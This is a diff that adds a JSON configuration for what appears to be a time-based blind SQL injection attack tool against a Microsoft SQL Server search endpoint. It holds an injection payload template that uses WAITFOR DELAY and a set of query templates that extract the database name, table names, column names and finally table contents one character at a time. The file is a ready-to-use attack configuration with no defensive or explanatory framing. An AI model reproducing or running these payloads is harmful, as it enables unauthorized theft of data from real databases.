@@ -1,0 +1,19 @@
+{
+    "target_url": "http://example.com/api/v1/search",
+    "method": "POST",
+    "target_param": "query",
+    "injection_type": "time",
+    "time_threshold": 3.0,
+    "success_keyword": "Welcome",
+    "payload_template": "1'; IF ({query}) WAITFOR DELAY '0:0:3'--",
+    "queries": {
+      "get_db": "ascii(substring((SELECT db_name()), {pos}, 1)) = {ascii_val}",
+      "get_tables": "ascii(substring((SELECT name FROM sys.tables ORDER BY name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY), {pos}, 1)) = {ascii_val}",
+      "get_columns": "ascii(substring((SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{table}') ORDER BY name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY), {pos}, 1)) = {ascii_val}",
+      "dump_data": "ascii(substring((SELECT CAST({column} AS VARCHAR) FROM {table} ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY), {pos}, 1)) = {ascii_val}"
+    },
+    "headers": {
+      "User-Agent": "Mozilla/5.0",
+      "Content-Type": "application/json"
+    }
+  }
